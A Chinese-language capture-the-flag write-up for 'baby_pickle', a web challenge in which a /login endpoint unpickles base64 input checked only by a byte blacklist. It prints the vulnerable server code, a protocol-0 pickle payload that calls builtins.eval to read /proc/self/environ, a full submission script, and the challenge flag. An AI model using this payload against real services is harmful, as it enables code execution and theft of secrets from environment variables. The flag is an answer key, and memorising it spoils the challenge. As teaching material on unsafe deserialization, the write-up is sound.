# baby_pickle

## 题目简述

`/login` 会 Base64 解码表单字段 `data`，经过简单字节黑名单后直接执行 `pickle.loads()`。反序列化结果随后通过 `user.username` 回显，因此可以手写协议 0 opcode 调用 `builtins.eval`，返回一个 `username` 属性包含进程环境变量的对象，全程不需要 DNS/HTTP 外带。

## 解题过程

服务端逻辑为：

```python
opcode = b64decode(data)
for word in [b'\x00', b'\x1e', b'system', b'popen', b'os', b'sys', b'posix']:
    if word in opcode:
        return "Hacker!"
user = pickle.loads(opcode)
return "<h1>Hello {}</h1>".format(user.username)
```

黑名单检查的是序列化字节本身，而协议 0 可以完全使用可打印 ASCII。以下 opcode 的含义依次是：压入 MARK、取得 `builtins.eval`、压入表达式、用 `OBJ` 调用函数、以 `STOP` 结束。

```text
(cbuiltins
eval
S'type("U",(),{"username":open("/proc/self/environ","rb").read().decode()})()'
o.
```

表达式动态创建一个对象，把 `/proc/self/environ` 的内容放入 `username`。其中没有命中题目列出的任何禁用字节。下面脚本生成载荷并提交：

```python
import base64
import urllib.parse
import urllib.request

expr = 'type("U",(),{"username":open("/proc/self/environ","rb").read().decode()})()'
opcode = f"(cbuiltins\neval\nS'{expr}'\no.".encode()

blacklist = [b"\x00", b"\x1e", b"system", b"popen", b"os", b"sys", b"posix"]
assert all(word not in opcode for word in blacklist)

body = urllib.parse.urlencode({
    "data": base64.b64encode(opcode).decode(),
}).encode()
request = urllib.request.Request(
    "http://TARGET/login",
    data=body,
    method="POST",
)
print(urllib.request.urlopen(request).read().decode(errors="replace"))
```

环境变量之间以 NUL 分隔，直接在响应中搜索 `flag=`，可得到：

```text
flag=0xGame{Pickle_Unserliaze_Without_Any_Limit_Is_Not_Safe!}
```

因此 flag 为：

```text
0xGame{Pickle_Unserliaze_Without_Any_Limit_Is_Not_Safe!}
```

## 方法总结

漏洞根因是对不可信数据调用 `pickle.loads()`；关键不是绕过某个危险函数名，而是 pickle 本身具有调用全局对象的能力。本题还能借助 `user.username` 获得原生回显，所以没有必要保留临时 Collaborator 域名或依赖外带服务。
